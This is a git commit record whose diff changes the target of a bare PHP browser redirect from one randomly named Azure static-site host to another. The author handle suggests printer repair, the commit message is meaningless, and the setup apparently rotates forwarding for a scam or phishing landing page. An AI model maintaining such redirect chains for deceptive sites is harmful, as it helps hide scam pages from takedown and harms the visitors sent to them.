ab7ba2b6c33ec2e0b7b348a249974b9e9bc46580
repairprinters379 <repairprinters379@gmail.com>
2025-01-10 20:34:08 +0530

    deddws

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://mi7jip8ujcore8ufix97.z21.web.core.windows.net/");
+header("Location: https://smo65ky5efur65mr.z24.web.core.windows.net/");
  
 exit;
 ?>
